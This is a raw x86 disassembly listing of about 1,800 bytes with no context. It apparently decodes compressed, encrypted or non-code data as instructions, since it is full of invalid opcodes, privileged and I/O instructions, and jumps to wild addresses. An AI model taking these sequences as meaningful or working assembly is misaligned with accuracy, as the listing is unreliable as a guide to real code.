  40392a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40392c:	std    
  40392d:	loope  0x40399e
  40392f:	jne    0x403910
  403931:	cs mov esp,0xa715372b
  403937:	rcr    ch,cl
  403939:	lea    ebp,[ecx+edi*1+0x180fa0d8]
  403940:	jo     0x403989
  403942:	cmpps  xmm2,XMMWORD PTR [edx],0xad
  403946:	jo     0x4039ae
  403948:	out    0xb5,eax
  40394a:	inc    edi
  40394b:	cmp    BYTE PTR [esi+0x68937ec2],al
  403951:	add    bl,dl
  403953:	mov    esp,DWORD PTR ds:0x8d89c178
  403959:	add    eax,0x4613b20f
  40395e:	jl     0x4039c5
  403960:	call   0xe8223ca4
  403965:	or     BYTE PTR [eax+0x212ab5eb],dh
  40396b:	or     eax,0x6c87655f
  403970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403971:	mov    cl,0x64
  403973:	mov    BYTE PTR [esi+0x7e],ch
  403976:	xor    DWORD PTR [ebx],edi
  403978:	push   eax
  403979:	hlt    
  40397a:	mov    ecx,DWORD PTR [ecx-0x42272475]
  403980:	lods   al,BYTE PTR ds:[esi]
  403981:	outs   dx,BYTE PTR ds:[esi]
  403982:	push   ebx
  403983:	dec    eax
  403984:	outs   dx,DWORD PTR ds:[esi]
  403985:	hlt    
  403986:	out    dx,eax
  403987:	push   edi
  403988:	and    ebx,DWORD PTR [esi+ecx*2-0xb66df6a]
  40398f:	nop
  403990:	into   
  403991:	(bad)  
  403992:	fsub   st,st(3)
  403994:	sahf   
  403995:	adc    edi,DWORD PTR [ebp+0x1792c848]
  40399b:	ds mov ecx,0xa0d7f69
  4039a1:	retf   
  4039a2:	jnp    0x4039d7
  4039a4:	ja     0x40393a
  4039a6:	dec    ebx
  4039a7:	mov    ebx,0x1e303bb6
  4039ac:	jge    0x403988
  4039ae:	mov    esp,0xf2cdd347
  4039b3:	aas    
  4039b4:	or     esp,DWORD PTR [ebx]
  4039b6:	icebp  
  4039b7:	sbb    BYTE PTR [edx-0x16],0x86
  4039bb:	push   cs
  4039bc:	(bad)  
  4039bd:	jmp    0x307128f1
  4039c2:	scas   eax,DWORD PTR es:[edi]
  4039c3:	cmp    DWORD PTR [esi-0x36c11bbd],esi
  4039c9:	mov    al,ds:0xcb5e5253
  4039ce:	pushf  
  4039cf:	fsubr  QWORD PTR [edi+0x7c527a1f]
  4039d5:	mov    ds:0x2d87a9d8,al
  4039da:	aaa    
  4039db:	pop    ecx
  4039dc:	fcomp  QWORD PTR [ecx]
  4039de:	std    
  4039df:	dec    BYTE PTR [eax-0x4b]
  4039e2:	fdivr  DWORD PTR [edi+0x3b]
  4039e5:	imul   ecx,esi,0xffffffb2
  4039e8:	lods   eax,DWORD PTR ds:[esi]
  4039e9:	je     0x403a3e
  4039eb:	mov    ah,BYTE PTR ds:0xe390f404
  4039f1:	dec    edx
  4039f2:	or     al,0xf0
  4039f4:	or     eax,0x656b06c0
  4039f9:	sub    al,0x80
  4039fb:	dec    ecx
  4039fc:	push   cs
  4039fd:	mov    eax,0x387e7aa9
  403a02:	hlt    
  403a03:	jb     0x4039d4
  403a05:	popa   
  403a06:	ret    
  403a07:	imul   esi,edx,0xffffffc9
  403a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a0b:	inc    esi
  403a0c:	mov    ds:0x6d8158df,al
  403a11:	repz ror DWORD PTR [ecx],cl
  403a14:	fistp  DWORD PTR [edi+ebp*1]
  403a17:	lahf   
  403a18:	fmul   QWORD PTR [esi+0x23]
  403a1b:	add    esi,DWORD PTR [ebp+0x29c6de27]
  403a21:	push   0xffffff90
  403a23:	sahf   
  403a24:	dec    ebx
  403a25:	sbb    BYTE PTR [ecx+ebx*1+0x19],dl
  403a29:	hlt    
  403a2a:	inc    edi
  403a2b:	dec    esp
  403a2c:	ins    DWORD PTR es:[edi],dx
  403a2d:	ror    esp,cl
  403a2f:	popf   
  403a30:	push   es
  403a31:	pop    esi
  403a32:	push   esp
  403a33:	add    eax,0x62348386
  403a38:	out    0x51,al
  403a3a:	push   ds
  403a3b:	clc    
  403a3c:	push   0x21
  403a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a3f:	aas    
  403a40:	arpl   WORD PTR [ebp-0x58869df5],bp
  403a46:	jmp    0x5ff3:0x6ec7ef36
  403a4d:	sub    eax,0xac954195
  403a52:	cmp    al,0x50
  403a54:	hlt    
  403a55:	(bad)
  403a58:	inc    esi
  403a59:	lock and ah,cl
  403a5c:	jns    0x403ada
  403a5e:	mov    cl,0x92
  403a60:	push   ss
  403a61:	jp     0x403ac4
  403a63:	aas    
  403a64:	jge    0x403a9d
  403a66:	fisubr WORD PTR [ebp+0x72]
  403a69:	fwait
  403a6a:	cld    
  403a6b:	jp     0x403aa0
  403a6d:	aam    0xb
  403a6f:	and    al,0xef
  403a71:	ins    DWORD PTR es:[edi],dx
  403a72:	stos   DWORD PTR es:[edi],eax
  403a73:	sub    ebx,DWORD PTR [esi+0x20]
  403a76:	or     esi,DWORD PTR [ecx]
  403a78:	add    al,0x7
  403a7a:	jmp    0x7ec8e474
  403a7f:	pop    edx
  403a80:	jmp    0xb35c:0x6379a617
  403a87:	mov    dl,0x5e
  403a89:	mov    ecx,edi
  403a8b:	(bad)  
  403a8c:	sub    bl,cl
  403a8e:	jne    0x403ace
  403a90:	aad    0xfe
  403a92:	push   ebp
  403a93:	ins    BYTE PTR es:[edi],dx
  403a94:	test   ah,al
  403a96:	dec    ebx
  403a97:	mov    esp,DWORD PTR [eax-0x37]
  403a9a:	xchg   esi,eax
  403a9b:	pop    ds
  403a9c:	fcomp  st(5)
  403a9e:	js     0x403b13
  403aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aa1:	add    edx,ebp
  403aa3:	(bad)  
  403aa4:	dec    edx
  403aa5:	call   0x6b0d43df
  403aaa:	mov    gs,dx
  403aad:	inc    ecx
  403aae:	inc    edi
  403aaf:	xchg   ecx,eax
  403ab0:	jg     0x403ae8
  403ab2:	inc    ecx
  403ab3:	xor    DWORD PTR [ebx-0x60],ebp
  403ab6:	cmp    ah,BYTE PTR [eax+0x1efc2953]
  403abc:	or     bh,cl
  403abe:	xor    al,0x8d
  403ac0:	sbb    eax,0xd29357bd
  403ac5:	xchg   esp,eax
  403ac6:	inc    edi
  403ac7:	in     eax,0x24
  403ac9:	cmp    dh,0x8
  403acc:	arpl   WORD PTR [edi+0x101ee7f7],si
  403ad2:	ins    DWORD PTR es:[edi],dx
  403ad3:	outs   dx,DWORD PTR ds:[esi]
  403ad4:	dec    esi
  403ad5:	std    
  403ad6:	pop    eax
  403ad7:	cwde   
  403ad8:	inc    esi
  403ad9:	das    
  403ada:	es js  0x403b42
  403add:	sar    ch,0x5b
  403ae0:	cmp    ah,ch
  403ae2:	sbb    al,0x96
  403ae4:	les    ebp,FWORD PTR [edi]
  403ae6:	mov    ds:0xd5b9bb66,al
  403aeb:	jmp    0xe4b2:0x1f7c8d4
  403af2:	js     0x403b4d
  403af4:	cli    
  403af5:	mov    ds:0xf5898882,al
  403afa:	xor    ch,BYTE PTR [esp+ebx*2]
  403afd:	mov    bl,0x87
  403aff:	jns    0x403b14
  403b01:	lods   eax,DWORD PTR ds:[esi]
  403b02:	(bad)  
  403b03:	cmp    bh,BYTE PTR es:[edi+0x7c]
  403b07:	in     eax,0x57
  403b09:	ja     0x403aad
  403b0b:	retf   
  403b0c:	dec    edi
  403b0d:	dec    DWORD PTR [ebp-0x3b2cea46]
  403b13:	mov    ebp,0xd402d2db
  403b18:	lahf   
  403b19:	lahf   
  403b1a:	inc    esp
  403b1b:	rcr    DWORD PTR [esi-0x50],cl
  403b1e:	leave  
  403b1f:	fcmovnu st,st(6)
  403b21:	add    ebp,0xffffffd1
  403b24:	sbb    bl,BYTE PTR [ebx+eax*4+0x253bd258]
  403b2b:	test   DWORD PTR [ebp+0x1],esp
  403b2e:	or     al,0x67
  403b30:	dec    ecx
  403b31:	sub    edi,DWORD PTR [esi-0x606d778d]
  403b37:	addr16 mov ds:0x48ac,eax
  403b3b:	inc    edx
  403b3c:	lea    ebp,[ebx]
  403b3e:	data16 icebp 
  403b40:	or     al,0xbf
  403b42:	loopne 0x403b06
  403b44:	pop    edi
  403b45:	mov    esp,eax
  403b47:	mov    ecx,0x8573ab11
  403b4c:	push   es
  403b4d:	aad    0x33
  403b4f:	push   ebx
  403b50:	adc    ebp,DWORD PTR ds:0x13d7f59f
  403b56:	pop    ebx
  403b57:	xor    dl,BYTE PTR ds:0xc4269db2
  403b5d:	or     DWORD PTR [edx+0x3b],0x54
  403b61:	iret   
  403b62:	ja     0x403ae6
  403b64:	int3   
  403b65:	push   0x875989d8
  403b6a:	xor    al,0x69
  403b6c:	fldenv [edx]
  403b6e:	dec    DWORD PTR [ecx+0x7d53b71f]
  403b74:	jecxz  0x403b9b
  403b76:	js     0x403b20
  403b78:	lea    edi,[edi+0x715ecbc]
  403b7e:	ins    BYTE PTR es:[edi],dx
  403b7f:	push   ebx
  403b80:	mov    dh,0xca
  403b82:	sub    dh,BYTE PTR [edx+0x5c577f53]
  403b88:	mov    esi,0x953a210c
  403b8d:	imul   edx,DWORD PTR [eax+0x17],0x42
  403b91:	mov    dl,0x1f
  403b93:	repz shr DWORD PTR [edi],1
  403b96:	fsubr  st,st(1)
  403b98:	stos   BYTE PTR es:[edi],al
  403b99:	pop    eax
  403b9a:	mov    dh,0xd3
  403b9c:	das    
  403b9d:	fldcw  WORD PTR ds:0xc41123e1
  403ba3:	ss push cs
  403ba5:	enter  0x1946,0xa0
  403ba9:	(bad)  
  403baa:	push   0xaa7be6e3
  403baf:	cld    
  403bb0:	fst    QWORD PTR [edx+0x5d]
  403bb3:	xchg   ecx,eax
  403bb4:	retf   
  403bb5:	mov    esp,esi
  403bb7:	pop    ds
  403bb8:	and    bl,ah
  403bba:	test   DWORD PTR [edx+0x79],esi
  403bbd:	popa   
  403bbe:	or     al,0x22
  403bc0:	xor    BYTE PTR gs:[esi],cl
  403bc3:	mov    edi,0xf62b6e11
  403bc8:	cwde   
  403bc9:	scas   al,BYTE PTR es:[edi]
  403bca:	std    
  403bcb:	jae    0x403b9d
  403bcd:	mov    ebx,esi
  403bcf:	mov    cl,0xd5
  403bd1:	dec    edx
  403bd2:	pop    esp
  403bd3:	fs pop esp
  403bd5:	and    ch,BYTE PTR [edx-0xc]
  403bd8:	pop    esp
  403bd9:	(bad)  
  403bda:	pop    edi
  403bdb:	pminsw mm5,QWORD PTR [ebx]
  403bde:	jge    0x403c40
  403be0:	fnop   
  403be2:	inc    eax
  403be3:	clc    
  403be4:	outs   dx,BYTE PTR ds:[esi]
  403be5:	dec    DWORD PTR [ebp+ecx*2-0x63563f41]
  403bec:	add    bh,bh
  403bee:	ror    BYTE PTR [edx],0xbe
  403bf1:	dec    edi
  403bf2:	pop    edx
  403bf3:	push   edi
  403bf4:	ins    DWORD PTR es:[edi],dx
  403bf5:	adc    dh,0x40
  403bf8:	call   0x699edf63
  403bfd:	ror    BYTE PTR [ecx],0x31
  403c00:	cwde   
  403c01:	dec    edi
  403c02:	sbb    al,0xb1
  403c04:	out    0xc0,eax
  403c06:	adc    esi,DWORD PTR [ecx-0x60]
  403c09:	mov    al,BYTE PTR [esi]
  403c0b:	pop    ss
  403c0c:	xchg   ebp,eax
  403c0d:	and    edx,edx
  403c0f:	fwait
  403c10:	clc    
  403c11:	push   edx
  403c12:	dec    ecx
  403c13:	xchg   esi,eax
  403c14:	mov    ds:0x3d6d6331,eax
  403c19:	into   
  403c1a:	sub    edi,DWORD PTR [eax-0x5dbab551]
  403c20:	mov    al,ds:0xc71bb075
  403c25:	xchg   ebx,eax
  403c26:	cmc    
  403c27:	(bad)  
  403c28:	stc    
  403c29:	mov    eax,0xa378350
  403c2e:	dec    ebx
  403c2f:	in     eax,dx
  403c30:	leave  
  403c31:	mov    ds:0x9fdd55cc,eax
  403c36:	mov    ah,0x6c
  403c38:	sbb    al,0x2b
  403c3a:	and    al,0xfe
  403c3c:	test   al,0xd4
  403c3e:	icebp  
  403c3f:	or     eax,0x2f5d6dfa
  403c44:	imul   ebx,DWORD PTR [ecx+ebx*8-0x315ccd0c],0xffffffc9
  403c4c:	push   ebp
  403c4d:	dec    edx
  403c4e:	mov    dh,0x69
  403c50:	jge    0x403cb7
  403c52:	add    DWORD PTR [eax+0x367c885e],esp
  403c58:	pusha  
  403c59:	out    dx,al
  403c5a:	xchg   ebx,eax
  403c5b:	ficom  DWORD PTR [ebx+0x385866ff]
  403c61:	sbb    al,0x7c
  403c63:	cmp    ecx,DWORD PTR [ebx+eiz*2-0x6]
  403c67:	mov    eax,0x310372e5
  403c6c:	stc    
  403c6d:	ja     0x403cd8
  403c6f:	mov    ebx,0xfaacfa85
  403c74:	in     al,0x79
  403c76:	pop    esp
  403c77:	add    cl,BYTE PTR [ebx+ebp*2-0x40407ec0]
  403c7e:	jae    0x403c2e
  403c80:	pop    esp
  403c81:	jmp    0xc9cb:0x2da5695c
  403c88:	push   0x596266fe
  403c8d:	mov    ecx,0xadb3cebc
  403c92:	sub    eax,ebx
  403c94:	and    al,0x4b
  403c96:	mov    dh,0xcb
  403c98:	push   eax
  403c99:	dec    eax
  403c9a:	fcmovnb st,st(3)
  403c9c:	push   eax
  403c9d:	pop    ss
  403c9e:	popa   
  403c9f:	cmp    al,0xe1
  403ca1:	jg     0x403cdd
  403ca3:	mov    dl,0xa9
  403ca5:	xchg   esp,eax
  403ca6:	push   ebx
  403ca7:	stc    
  403ca8:	arpl   dx,sp
  403caa:	ret    0x762b
  403cad:	mov    esi,0x38dad51e
  403cb2:	pop    esp
  403cb3:	cdq    
  403cb4:	das    
  403cb5:	and    esp,DWORD PTR [esi]
  403cb7:	push   ds
  403cb8:	dec    ecx
  403cb9:	cmp    DWORD PTR gs:[edx],edi
  403cbc:	cmc    
  403cbd:	lahf   
  403cbe:	sub    al,0x84
  403cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc1:	imul   eax,DWORD PTR [ecx],0x390126ef
  403cc7:	cmp    al,0x88
  403cc9:	(bad)  
  403cca:	hlt    
  403ccb:	cs arpl cx,bp
  403cce:	xor    DWORD PTR [bx+0x6d],esp
  403cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cd3:	jg     0x403d41
  403cd5:	or     DWORD PTR ds:0x20050c6d,0xffffffb1
  403cdc:	xchg   ecx,eax
  403cdd:	inc    ebp
  403cde:	imul   edx,DWORD PTR [esi-0x1f],0xffffffa6
  403ce2:	(bad)  
  403ce3:	arpl   WORD PTR [ebp-0x40],di
  403ce6:	clts   
  403ce8:	jmp    0x8521:0x1ed0cbb0
  403cef:	cmp    al,0xcf
  403cf1:	fwait
  403cf2:	sub    DWORD PTR [ecx+ebp*2-0x3a],0xe9327638
  403cfa:	xchg   DWORD PTR [esi-0x54698f4],ebx
  403d00:	(bad)  
  403d01:	mov    cl,0x76
  403d03:	mov    ebx,0x74e85f67
  403d08:	popf   
  403d09:	cld    
  403d0a:	pop    edx
  403d0b:	or     BYTE PTR [edi-0x791e3923],0x1
  403d12:	sub    eax,0xfe45547
  403d17:	jnp    0x403ce8
  403d19:	or     BYTE PTR [esi-0x4af6bbc4],ch
  403d1f:	loop   0x403d8f
  403d21:	arpl   WORD PTR [ecx-0x370dc11f],bx
  403d27:	mov    al,ds:0x6061ac33
  403d2c:	or     esi,ebx
  403d2e:	adc    DWORD PTR [ebx+0xa5c2af9],edi
  403d34:	and    ch,BYTE PTR [edx]
  403d36:	ss out 0xf5,al
  403d39:	ss add al,0xa
  403d3c:	popf   
  403d3d:	out    0xca,al
  403d3f:	adc    al,0x69
  403d41:	je     0x403da2
  403d43:	push   0xdd70af89
  403d48:	ror    DWORD PTR [esi+0x440f7061],0x12
  403d4f:	pushf  
  403d50:	dec    eax
  403d51:	xor    al,0xa3
  403d53:	je     0x403d52
  403d55:	repz xlat BYTE PTR ds:[ebx]
  403d57:	pop    ecx
  403d58:	xchg   esi,eax
  403d59:	and    edi,DWORD PTR [edi-0x6df86120]
  403d5f:	cmp    bh,BYTE PTR [edi-0x22]
  403d62:	adc    ah,ch
  403d64:	int    0xae
  403d66:	iret   
  403d67:	outs   dx,DWORD PTR ds:[esi]
  403d68:	mov    ds,WORD PTR [esi+eiz*1-0x62]
  403d6c:	sbb    BYTE PTR [edi+0x4f2cf807],cl
  403d72:	dec    eax
  403d73:	push   cs
  403d74:	(bad)  
  403d75:	sub    DWORD PTR [esi],esi
  403d77:	and    DWORD PTR [ebx+0x4c37cb3f],esp
  403d7d:	aaa    
  403d7e:	push   ss
  403d7f:	das    
  403d80:	sub    dh,ah
  403d82:	sbb    ebx,0x3f399fa
  403d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d89:	add    DWORD PTR [ebx-0x50e0ab82],eax
  403d8f:	jmp    0x2898:0xd7c20591
  403d96:	sbb    DWORD PTR [edx+0x55f7b793],esi
  403d9c:	and    bh,cl
  403d9e:	pop    es
  403d9f:	pop    ss
  403da0:	jge    0x403d3e
  403da2:	adc    DWORD PTR [esi+0x4a0cfaaa],eax
  403da8:	sbb    DWORD PTR [ebx+0x5e],esi
  403dab:	jae    0x403d7f
  403dad:	mov    edi,0x742798ca
  403db2:	xchg   esi,eax
  403db3:	cli    
  403db4:	lock push edx
  403db6:	or     ch,BYTE PTR [ebx-0x79c45761]
  403dbc:	mov    dh,0x23
  403dbe:	mov    dh,al
  403dc0:	clc    
  403dc1:	dec    eax
  403dc2:	int    0x1
  403dc4:	dec    esp
  403dc5:	imul   esp,eax,0x67b21ab6
  403dcb:	test   eax,0x579a359
  403dd0:	adc    eax,0x2338db36
  403dd5:	xor    ch,BYTE PTR [edi+0x471a2641]
  403ddb:	mov    ds:0xbb6bb742,eax
  403de0:	(bad)
  403de4:	push   esp
  403de5:	mov    edx,0xee3a095f
  403dea:	and    DWORD PTR [edi+0x8],edx
  403ded:	in     eax,0x9c
  403def:	xor    DWORD PTR [esi],0xe
  403df2:	dec    edx
  403df3:	push   esi
  403df4:	push   esp
  403df5:	jp     0x403e09
  403df7:	ss out dx,al
  403df9:	xchg   edx,eax
  403dfa:	pusha  
  403dfb:	cli    
  403dfc:	outs   dx,DWORD PTR ds:[esi]
  403dfd:	sbb    DWORD PTR [ecx],ebp
  403dff:	rcr    BYTE PTR [esi],cl
  403e01:	inc    esp
  403e02:	add    esp,eax
  403e04:	sti    
  403e05:	mov    ah,0x85
  403e07:	test   BYTE PTR [eax-0x488d8e4f],0xe9
  403e0e:	jmp    0x6ae6:0x322b2525
  403e15:	dec    eax
  403e16:	push   es
  403e17:	pop    ecx
  403e19:	je     0x403dd1
  403e1b:	sbb    eax,0x2503b2ba
  403e20:	test   al,0x2f
  403e22:	mov    dl,0x1f
  403e24:	fstp   TBYTE PTR [edx+ecx*4+0x6]
  403e28:	in     al,dx
  403e29:	jne    0x403e6b
  403e2b:	sahf   
  403e2c:	(bad)  
  403e2d:	xor    DWORD PTR [edi+0x51],ebp
  403e30:	lds    ecx,FWORD PTR [edx]
  403e32:	aam    0xf9
  403e34:	(bad)
  403e37:	pop    es
  403e38:	mov    edi,0xb7774025
  403e3d:	xchg   ebp,eax
  403e3e:	mov    ch,0x9d
  403e40:	pop    ebp
  403e41:	xor    ah,BYTE PTR [ecx+0x2a]
  403e44:	xchg   ebx,eax
  403e45:	mov    WORD PTR [esi],cs
  403e47:	fsub   st,st(7)
  403e49:	imul   ecx,DWORD PTR [edx],0x2e
  403e4c:	pushf  
  403e4d:	pop    edx
  403e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e4f:	iret   
  403e50:	fst    QWORD PTR [eax+esi*1+0x6a1d3595]
  403e57:	xchg   edi,eax
  403e58:	dec    esp
  403e59:	out    dx,al
  403e5a:	mov    esi,0x1068cc7f
  403e5f:	stc    
  403e60:	call   0x235df07a
  403e65:	in     al,0x2b
  403e67:	or     esi,DWORD PTR [edi-0x5f]
  403e6a:	cs jnp 0x403e13
  403e6d:	aad    0x24
  403e6f:	sbb    ch,BYTE PTR [esi-0x4ec739c4]
  403e75:	aad    0x7b
  403e77:	mov    dl,0x77
  403e79:	(bad)  
  403e7a:	fdivr  DWORD PTR [eax-0x2b92856]
  403e80:	jmp    0x5939ac53
  403e85:	push   cs
  403e86:	mov    bl,0xce
  403e88:	mov    BYTE PTR [ebp-0x6d],dh
  403e8b:	adc    bh,BYTE PTR es:[edx+0x36]
  403e8f:	pop    edi
  403e90:	out    0x15,al
  403e92:	popf   
  403e93:	dec    eax
  403e94:	stos   BYTE PTR es:[edi],al
  403e95:	test   DWORD PTR [ebx],edi
  403e97:	outs   dx,DWORD PTR ds:[esi]
  403e98:	xchg   ebp,eax
  403e99:	push   edi
  403e9a:	gs dec edi
  403e9c:	jg     0x403e77
  403e9e:	or     al,0xc3
  403ea0:	cmp    ecx,eax
  403ea2:	sub    al,0xa4
  403ea4:	inc    BYTE PTR [edi-0x65]
  403ea7:	hlt    
  403ea8:	mov    BYTE PTR [eax-0x70d8f7ee],0xec
  403eaf:	push   ss
  403eb0:	mov    ds:0x451e020a,al
  403eb5:	sbb    bh,BYTE PTR [ecx+0x7cbf9525]
  403ebb:	sbb    al,0x7b
  403ebd:	jg     0x403e9b
  403ebf:	mov    ecx,0x38dafd4
  403ec4:	or     cl,cl
  403ec6:	(bad)  
  403ec7:	in     al,dx
  403ec8:	leave  
  403ec9:	cmc    
  403eca:	inc    edx
  403ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ecc:	scas   al,BYTE PTR es:[edi]
  403ecd:	mov    esp,0x71ecbf4b
  403ed2:	sbb    esp,DWORD PTR [ebp+eax*1+0x8]
  403ed6:	es in  al,0x69
  403ed9:	setns  ch
  403edc:	pop    ecx
  403edd:	pop    edi
  403ede:	jo     0x403ec4
  403ee0:	sub    cl,BYTE PTR [edi]
  403ee2:	retf   
  403ee3:	mov    ebx,0x8ef556ca
  403ee8:	lea    edi,[ecx+0x45]
  403eeb:	test   bh,bh
  403eed:	enter  0xc890,0xb4
  403ef1:	xchg   esi,eax
  403ef2:	mov    edx,0xc3d4f98c
  403ef7:	repnz mov ebp,0x1ef14531
  403efd:	mov    bh,0x99
  403eff:	xchg   ebp,eax
  403f00:	scas   al,BYTE PTR es:[edi]
  403f01:	adc    al,0x14
  403f03:	pop    edi
  403f04:	mov    gs:0xc286213e,eax
  403f0a:	mov    esp,0x71e4bbde
  403f0f:	sub    eax,0x8ae695f9
  403f14:	sbb    al,0x9d
  403f16:	adc    al,0x20
  403f18:	push   ebx
  403f19:	pop    edi
  403f1a:	ret    
  403f1b:	ins    BYTE PTR es:[edi],dx
  403f1c:	retf   0xc586
  403f1f:	jo     0x403ee5
  403f21:	nop
  403f22:	stos   DWORD PTR es:[edi],eax
  403f23:	xchg   edi,eax
  403f24:	jmp    0x403ee3
  403f26:	ss int 0xfb
  403f29:	mov    ds:0x5556bf4e,eax
  403f2e:	and    BYTE PTR [edi+0x21dd6903],ah
  403f34:	mov    ebx,0x99981746
  403f39:	test   al,0xe6
  403f3b:	std    
  403f3c:	dec    esi
  403f3d:	mov    ah,dh
  403f3f:	inc    esi
  403f40:	aaa    
  403f41:	imul   eax,DWORD PTR [edi+0x1c394349],0x3edc9c4f
  403f4b:	push   edx
  403f4c:	cmp    ah,ah
  403f4e:	mov    bl,BYTE PTR [esi+esi*2-0x72]
  403f52:	add    BYTE PTR [edx-0x1e],bh
  403f55:	jne    0x403fa1
  403f57:	dec    edx
  403f58:	int3   
  403f59:	out    dx,eax
  403f5a:	ret    
  403f5b:	(bad)  
  403f5c:	cmp    eax,0x37c4673e
  403f61:	inc    ebp
  403f62:	jp     0x403f53
  403f64:	xor    esp,eax
  403f66:	add    BYTE PTR [edx+0x10],0xf8
  403f6a:	aam    0xb6
  403f6c:	mov    dl,BYTE PTR [edi+0x4b7a4ac9]
  403f72:	sbb    BYTE PTR [ebx+0x4b],dl
  403f75:	pop    eax
  403f76:	stos   BYTE PTR es:[edi],al
  403f77:	adc    al,0x39
  403f79:	and    bl,bh
  403f7b:	sar    ebp,1
  403f7d:	mov    ch,0x9a
  403f7f:	xor    ebp,DWORD PTR [ecx+0x6]
  403f82:	(bad)  
  403f83:	hlt    
  403f84:	jmp    0x403f82
  403f86:	ror    BYTE PTR [edi-0x7d6f61db],0xbd
  403f8d:	jnp    0x403ffe
  403f8f:	test   cl,dh
  403f91:	outs   dx,DWORD PTR ds:[esi]
  403f92:	fcomp  QWORD PTR [ebp-0x50bb6fd]
  403f98:	add    DWORD PTR [esi+ecx*1-0x43],ecx
  403f9c:	xchg   edx,eax
  403f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f9e:	icebp  
  403f9f:	dec    ebp
  403fa0:	or     ch,cl
  403fa2:	fst    st(2)
  403fa4:	dec    esp
  403fa5:	inc    esp
  403fa6:	push   cs
  403fa7:	sbb    ah,BYTE PTR [ebp-0x4bfe4419]
  403fad:	xor    DWORD PTR [edx],esi
  403faf:	push   edx
  403fb0:	sub    al,BYTE PTR [edx]
  403fb2:	rcr    esp,0x49
  403fb5:	fdivrp st(0),st
  403fb7:	or     al,BYTE PTR [esi+0x32]
  403fba:	lahf   
  403fbb:	nop
  403fbc:	jle    0x403f7f
  403fbe:	add    esp,DWORD PTR [esi+0x4d752f47]
  403fc4:	cli    
  403fc5:	pop    ss
  403fc6:	or     DWORD PTR [ecx+0x4daa35a4],eax
  403fcc:	clc    
  403fcd:	pop    es
  403fce:	xor    edi,esi
  403fd0:	mov    dh,0x95
  403fd3:	xlat   BYTE PTR ds:[ebx]
  403fd4:	adc    eax,DWORD PTR [eax-0x64]
  403fd7:	inc    edx
  403fd8:	popa   
  403fd9:	xchg   DWORD PTR [eax],esi
  403fdb:	lods   eax,DWORD PTR ds:[esi]
  403fdc:	cmp    bl,bl
  403fde:	ds aas 
  403fe0:	or     eax,0xd2c580c4
  403fe5:	add    dl,cl
  403fe7:	jmp    0xfff6992e
  403fec:	cmp    al,0x4f
  403fee:	imul   ebx,DWORD PTR [edi+ebx*2+0x1e38de0],0x9415aba5
  403ff9:	cmp    al,0x6
  403ffb:	add    esp,esp
  403ffd:	dec    ecx
  403ffe:	mov    WORD PTR [ecx+ebp*1],ss
  404001:	or     ch,BYTE PTR [ecx]
  404003:	int3   
  404004:	pop    esi
  404005:	or     DWORD PTR [eax],esp
  404007:	pop    ecx
  404008:	test   BYTE PTR [esi-0x36],bh
  40400b:	mov    esi,0xf4be44b3
  404010:	pop    edi
  404011:	xor    ebp,DWORD PTR [ebp+0x79470026]
  404017:	sub    dh,BYTE PTR [esi+0xf0a731f]
  40401d:	test   BYTE PTR [esi-0x1b906cf2],0xb8
  404024:	dec    esi
  404025:	sbb    DWORD PTR [edi+0x29],ecx
  404028:	out    dx,eax
  404029:	mov    bh,ah
  40402b:	imul   edi,esi,0xca3f21e5
  404031:	and    al,0xb8
  404033:	pop    edi
  404034:	jmp    0x1b6ba1b2
  404039:	add    eax,0x55ea2f2f
  40403e:	add    ecx,ebp
  404040:	clc    
  404041:	fucomp st(7)
  404043:	popa   
  404044:	ja     0x403ff9
  404046:	test   DWORD PTR ds:0x3bcdbb46,edx
  40404c:	add    esp,DWORD PTR [eax+0x7ccdec6f]
  404052:	cli    
  404053:	jmp    0x4040a5
  404055:	loope  0x4040c9
  404057:	test   ecx,eax
  404059:	mov    eax,ds:0xc9f3f552
  40405e:	sub    ecx,DWORD PTR [ebp-0x36f780e9]
  404064:	repz jns 0x40407a
  404067:	xor    eax,DWORD PTR [ebp-0x26]
  40406a:	cmp    edi,eax
  40406c:	(bad)  
  40406d:	pop    ebx
  40406e:	inc    edx
  40406f:	mov    ah,bl
  404071:	inc    ah
  404073:	sub    DWORD PTR [edi+0x29],0x545d60a4
  40407a:	inc    ebx
  40407b:	sbb    BYTE PTR [edx+0x3ad85182],dl
  404081:	popa   
  404082:	aas    
  404083:	mov    eax,ds:0x2e86e8c7
  404088:	pop    edi
  404089:	fild   QWORD PTR [edx+ebp*8-0x2a]
  40408d:	sub    esi,DWORD PTR [eax+0x769ead70]
  404093:	pop    ebp
  404094:	and    dh,cl
  404096:	ret    
  404097:	lea    esp,ds:0xfaaa6ece
  40409d:	or     eax,0xf59e59ba
  4040a2:	push   cs
  4040a3:	ror    edi,0x22
  4040a6:	xchg   ecx,eax
  4040a7:	sbb    eax,0x5b5fb81f
  4040ac:	loop   0x4040c3
  4040ae:	gs inc ecx
  4040b0:	(bad)  
  4040b1:	jne    0x4040d1
  4040b3:	add    dl,BYTE PTR [ebx-0xd]
  4040b6:	pop    ecx
  4040b7:	adc    al,0xf5
  4040b9:	into   
  4040ba:	xor    eax,0xdb3cc436
  4040bf:	ds inc esp
  4040c1:	adc    cl,BYTE PTR [ebp-0x3d]
  4040c4:	call   0xfe600e4
  4040c9:	bound  eax,QWORD PTR [ecx-0xc529ff6]
  4040cf:	sub    ch,BYTE PTR [ecx+0x22]
  4040d2:	ds push ebp
  4040d4:	mov    bl,0xd
  4040d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040d8:	mov    dl,0x9c
  4040da:	xor    eax,0xe19d0ff4
  4040df:	pushf  
  4040e0:	inc    bh
  4040e2:	dec    esp
  4040e3:	icebp  
  4040e4:	xor    DWORD PTR [edi+0x7],esi
  4040e7:	mov    ebx,0x4181d928
  4040ec:	or     DWORD PTR [ecx+0x4a],esi
  4040ef:	out    0xdb,eax
  4040f1:	nop
  4040f2:	pushf  
